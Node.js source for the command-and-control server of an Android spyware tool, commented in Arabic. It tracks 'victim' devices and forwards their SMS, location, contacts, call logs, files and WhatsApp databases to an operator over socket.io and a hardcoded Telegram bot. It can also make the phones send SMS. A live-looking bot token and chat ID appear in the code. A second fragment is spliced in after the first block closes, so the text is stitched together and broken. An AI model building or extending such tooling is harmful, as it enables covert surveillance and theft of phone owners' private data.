const io = require("socket.io")(3000, { cors: { origin: "*" } });
const TelegramBot = require("node-telegram-bot-api");

// ضع التوكن الخاص بالبوت
const TOKEN = "6306639467:AAG69iSWfHTUMudYjFTkFciQPkN_OP-tcv4";
const CHAT_ID = "1794736105"; // معرف الشات اللي البوت يرسل له
const bot = new TelegramBot(TOKEN, { polling: true });

let adminSocketId = null;
let victimList = {};
let victimData = {};

// دالة إرسال إشعار للتيليجرام
function notifyTelegram(msg) {
  bot.sendMessage(CHAT_ID, msg);
}

io.on("connection", (socket) => {
  console.log(`📡 Socket connected: ${socket.id}`);

  socket.on("adminJoin", () => {
    adminSocketId = socket.id;
    notifyTelegram("👑 Admin joined السيرفر");
    Object.keys(victimData).forEach((key) => {
      socket.emit("join", victimData[key]);
    });
  });

  socket.on("join", (device) => {
    victimList[device.id] = socket.id;
    victimData[device.id] = { ...device, socketId: socket.id };
    notifyTelegram(`📱 جهاز جديد انضم:\n🆔 ${device.id}\n📱 الموديل: ${device.model}`);
    socket.broadcast.emit("join", { ...device, socketId: socket.id });
  });

  // مثال: إرسال SMS أو بيانات أخرى إلى التليجرام
  socket.on("getSMS", (data) => {
    notifyTelegram(`📩 SMS من ${data.number}: ${data.body}`);
  });

  socket.on("getLocation", (data) => {
    notifyTelegram(`📍 الموقع: lat=${data.lat}, lon=${data.lon}`);
  });

  socket.on("disconnect", () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
      notifyTelegram("⚠️ الأدمن قطع الاتصال!");
    } else {
      notifyTelegram(`❌ جهاز فقد الاتصال: ${socket.id}`);
    }
  });
});

// أوامر من التليجرام للتحكم
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (chatId != CHAT_ID) return; // تجاهل الرسائل من غيرك

  if (text.startsWith("/list")) {
    // إرسال قائمة الأجهزة
    let list = Object.keys(victimData)
      .map((id) => `🆔 ${id} | 📱 ${victimData[id].model}`)
      .join("\n");
    if (!list) list = "🚫 لا يوجد أجهزة متصلة";
    bot.sendMessage(chatId, list);
  }

  if (text.startsWith("/sms")) {
    const [_, deviceId, number, ...bodyArr] = text.split(" ");
    const body = bodyArr.join(" ");
    const victim = victimList[deviceId];
    if (victim) {
      io.to(victim).emit("request", {
        type: "sendSMS",
        number,
        body,
      });
      bot.sendMessage(chatId, `📤 إرسال SMS إلى ${number} من ${deviceId}`);
    } else {
      bot.sendMessage(chatId, "🚫 الجهاز غير متصل");
    }
  }
});      socket.on('getDir',(data)=>response("getDir",data));
      socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
      socket.on('getContacts',(data)=>response("getContacts",data));
      socket.on('sendSMS',(data)=>response("sendSMS",data));
      socket.on('getCallLog',(data)=>response("getCallLog",data));
      socket.on("previewImage", (data) =>response("previewImage",data));
      socket.on("error", (data) =>response("error",data));
      socket.on("getSMS", (data) =>response("getSMS",data));
      socket.on('getLocation',(data)=>response("getLocation",data));
     
      socket.on('disconnect', () => {
        if(socket.id===adminSocketId){
            adminSocketId=null
        }else{
            response("disconnectClient",socket.id)
            Object.keys(victimList).map((key)=>{
                if(victimList[key] === socket.id){
                  delete victimList[key]
                  delete victimData[key]
                }
              })
        }
    });
    
    socket.on("download", (d, callback) =>responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => {
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
       });


});

const request =(d)=>{
    let { to, action, data } = JSON.parse(d);
    log("Requesting action: "+ action);
    io.to(victimList[to]).emit(action, data);
  }

const response =(action, data)=>{
    if(adminSocketId){
        log("response action: "+ action);
        io.to(adminSocketId).emit(action, data);
    }
  }
  const responseBinary =(action, data, callback)=>{
    if(adminSocketId){
        log("response action: "+ action);
        callback("success")
        io.to(adminSocketId).emit(action, data);
    }
  }
 
const log = (log) =>{
    console.log(log)
  }
